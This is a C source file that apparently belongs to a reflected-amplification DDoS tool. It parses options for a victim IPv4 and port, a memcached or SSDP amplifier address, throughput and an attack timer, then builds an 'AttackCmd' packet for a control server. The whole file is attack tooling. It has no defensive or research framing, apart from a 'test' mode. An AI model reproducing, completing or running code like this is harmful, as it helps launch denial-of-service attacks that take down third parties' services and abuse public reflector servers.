#include <argp.h>
#include <argz.h>


#include "venus.h"
#include "interface/interface.h"
#include "interface/configr.h"
#include "monitor/crake.h"
#include "netuno/netuno.h"

#define UNKNOWCMD -1
#define ERRORIP -2

#define DEFAULT_TIMER 120
#define DEFAULT_TARGETPORT 80

const char *argp_program_bug_address = "rqtx@protonmail.com";
const char *argp_program_version = "version 0.1";

struct argp_option atkArgpOption[] =
{
    { "target", 't', "target_ipv4", 0, "Attack target IPV4"},
    { "amplifier", 'a', "amp_ipv4", 0, "Memcached amplifier IPV4"},
    { "amport", 'p', "am_port", 0, "Amplifier port"},
    { "targport", 'g', "targ_port", 0, "Target port"},
    { "full", 'f', "thp", 0, "Full attack with arg throughput"},
    { "timer", 'r', "timer", 0, "Attack timer"},
    { 0 }
};

int ParserAttackOpt (int key, char *arg, struct argp_state *state)
{ 
    LhfDraft * draft = state->input;
  
    switch (key)
    {
        case ARGP_KEY_ARG:
            if( !strcmp(arg, "test") || !strcmp(arg, "Test") || !strcmp(arg, "TEST") )
            {
                draft->amp_port = CRAKE_DEFAULT_PORT;
                draft->target_port = CRAKE_DEFAULT_PORT;
                draft->type = TEST;
                draft->initialThroughput = 1;
                draft->typeThroughput = 1;
                draft->timer = 60;
                draft->amp_port = CRAKE_DEFAULT_PORT;
            }
            else if( !strcmp(arg, "memcached") || !strcmp(arg, "Memcached") || !strcmp(arg, "MEMCACHED") )
            {
                draft->type = MEMCACHED;
            }
            else if( !strcmp(arg, "ssdp") || !strcmp(arg, "SSDP") )
            {
                draft->type = SSDP;
            }
            else
            {
                argp_state_help(state, stdout, ARGP_NO_EXIT); 
                return UNKNOWCMD; 
            }
            break;
        
        case 't':
            if( !is_valid_ipv4(arg) )
            {
                argp_state_help(state, stdout, ARGP_NO_EXIT);
                return ERRORIP;
            }
            memcpy(draft->target_ip, arg, strlen(arg));   
            break;

        case 'a':
            if( !is_valid_ipv4(arg) )
            {
                argp_state_help(state, stdout, ARGP_NO_EXIT); 
                return ERRORIP;
            }
            memcpy(draft->amp_ip, arg, strlen(arg));
            break;
        
        case 'p':
            draft->amp_port = (atoi(arg) > 0) ? atoi(arg) : 0;
            break;
        
        case 'g':
            draft->target_port = (atoi(arg) > 0) ? atoi(arg) : DEFAULT_TARGETPORT;
            break;

        case 'f':
            draft->initialThroughput = (atoi(arg) > 0) ? atoi(arg) : 0;
            draft->typeThroughput = FULL;
            break;
    
        case 'r':
            draft->timer = (atoi(arg) > 0) ? atoi(arg) : DEFAULT_TIMER;
            break;

  }
  return 0;
}
static struct argp argpAtk = { atkArgpOption, ParserAttackOpt, "CMD" };

Packet * CreateCmdPacket( CmdType p_type, int p_argc, char **p_argv )
{
    CommandPkt *cmdPkt = NULL;
    Packet *pac = CreateEmptyPacket();
    char *srvip = GetServerIP();
    int err = 0;

    memalloc( &cmdPkt , sizeof(CommandPkt) );
    
    switch( p_type )
    {
        case ExitCmd:
              cmdPkt->type = ExitCmd;
              cmdPkt->dataSize = 0;
              break;
        case AttackCmd:
            cmdPkt->type = AttackCmd;
            cmdPkt->dataSize = sizeof(LhfDraft);
            SetDraftDefaultData(&cmdPkt->data);
            if( (err = argp_parse(&argpAtk, p_argc, p_argv, 0, 0, &cmdPkt->data)) == 0 )
            {
                break;
            }
        default:
            memfree( &cmdPkt );
            return NULL;
    }

    pac->type = LHF;
    pac->packet_ptr = cmdPkt;
    pac->pkt_size = COMMANDPKT_HEADERSIZE + cmdPkt->dataSize;
    strcpy( pac->ip_dest,srvip);
    pac->dest_port = DEFAULT_COMPORT;
    pac->netSock = -1;
    pac->saddr.sin_family = AF_INET;
    pac->saddr.sin_port = htons(DEFAULT_COMPORT);
    pac->saddr.sin_addr.s_addr = inet_addr(srvip);

    return pac;
}

void SetDraftDefaultData( LhfDraft *p_draft )
{    
    p_draft->target_port = DEFAULT_TARGETPORT;
    p_draft->amp_port = 0;
    p_draft->initialThroughput = 0;
    p_draft->typeThroughput = INCREMENT;
    p_draft->timer = DEFAULT_TIMER;
}
